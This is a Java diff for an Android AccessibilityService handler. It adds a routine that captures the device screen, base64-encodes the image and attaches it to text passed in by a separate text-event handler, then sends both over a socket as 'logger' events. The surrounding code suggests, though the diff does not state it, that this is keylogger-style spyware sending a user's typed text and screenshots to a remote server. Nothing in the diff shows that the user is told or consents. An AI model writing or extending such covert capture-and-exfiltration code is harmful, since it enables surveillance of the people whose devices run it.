@@ -61,6 +61,42 @@ public class ScreenshotEventHandler {
             return;
         }
 
+        captureAndSend();
+    }
+
+    /**
+     * Capture screenshot programmatically and send as logger_image event.
+     * Used by TextEventHandler after text flush.
+     */
+    public void captureAndSend() {
+        captureAndSend(null);
+    }
+
+    /**
+     * Capture screenshot and combine with existing text message.
+     * @param existingMessage Optional existing text to combine with screenshot
+     */
+    public void captureAndSend(String existingMessage) {
+        // Only take screenshot if enabled in config
+        ConfigData config = configManager.getCachedConfig();
+        if (config == null || !config.isAutoScreenshotEnabled()) {
+            // If not enabled, just send the message without image
+            if (existingMessage != null) {
+                socketManager.sendEvent("logger", existingMessage);
+            }
+            return;
+        }
+
+        // Check if device supports screenshot functionality
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            if (existingMessage != null) {
+                socketManager.sendEvent("logger", existingMessage);
+            }
+            return;
+        }
+
+        final String messageToSend = existingMessage;
+
         try {
             service.takeScreenshot(
                     android.view.Display.DEFAULT_DISPLAY,
@@ -70,13 +106,18 @@ public class ScreenshotEventHandler {
                         public void onSuccess(AccessibilityService.ScreenshotResult result) {
                             try {
                                 if (result == null) {
-                                    socketManager.sendEvent("logger", "Screenshot result is null");
+                                    // Send without image
+                                    if (messageToSend != null) {
+                                        socketManager.sendEvent("logger", messageToSend);
+                                    }
                                     return;
                                 }
 
                                 HardwareBuffer buffer = result.getHardwareBuffer();
                                 if (buffer == null) {
-                                    socketManager.sendEvent("logger", "HardwareBuffer is null");
+                                    if (messageToSend != null) {
+                                        socketManager.sendEvent("logger", messageToSend);
+                                    }
                                     return;
                                 }
 
@@ -88,7 +129,9 @@ public class ScreenshotEventHandler {
                                 Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                 if (bitmap == null) {
                                     buffer.close();
-                                    socketManager.sendEvent("logger", "Failed to create bitmap from HardwareBuffer");
+                                    if (messageToSend != null) {
+                                        socketManager.sendEvent("logger", messageToSend);
+                                    }
                                     return;
                                 }
 
@@ -97,19 +140,35 @@ public class ScreenshotEventHandler {
                                 ConfigData cachedConfig = configManager.getCachedConfig();
                                 byte[] imageData = bitmapToJpegBytes(bitmap, cachedConfig.getScreenshotQuality());
                                 bitmap.recycle();
-                                socketManager.sendEvent("screenshot_response", imageData);
+
+                                // Combine text with image and send as single message
+                                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);
+                                String combinedMessage = messageToSend + "<<IMAGE>>" + base64Image;
+                                socketManager.sendEvent("logger", combinedMessage);
                             } catch (Exception e) {
-                                socketManager.sendEvent("logger", "Error processing screenshot: " + e.getMessage());
+                                android.util.Log.e(TAG, "Error processing screenshot: " + e.getMessage());
+                                // Send without image on error
+                                if (messageToSend != null) {
+                                    socketManager.sendEvent("logger", messageToSend);
+                                }
                             }
                         }
 
                         @Override
                         public void onFailure(int error) {
-                            socketManager.sendEvent("logger", "Screenshot failed with error code: " + error);
+                            android.util.Log.w(TAG, "Screenshot failed with error code: " + error);
+                            // Send without image on failure
+                            if (messageToSend != null) {
+                                socketManager.sendEvent("logger", messageToSend);
+                            }
                         }
                     });
         } catch (Exception e) {
-            socketManager.sendEvent("logger", "Error taking screenshot: " + e.getMessage());
+            android.util.Log.e(TAG, "Error taking screenshot: " + e.getMessage());
+            // Send without image on exception
+            if (messageToSend != null) {
+                socketManager.sendEvent("logger", messageToSend);
+            }
         }
     }
 
